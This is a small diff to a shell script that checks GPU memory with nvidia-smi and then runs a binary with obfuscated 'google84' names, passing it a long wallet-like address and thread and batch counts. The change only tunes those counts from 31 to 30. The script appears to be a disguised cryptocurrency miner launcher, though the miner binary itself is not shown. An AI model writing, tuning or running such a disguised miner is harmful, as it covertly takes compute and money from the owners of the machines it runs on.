@@ -27,7 +27,7 @@ google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | s
 if (($google84 >= 9188 && $google84 <= 16884));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 31 -b 31
+timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 30 -b 30
 if [ $? -eq 124 ]; then
 echo "google84"
 else
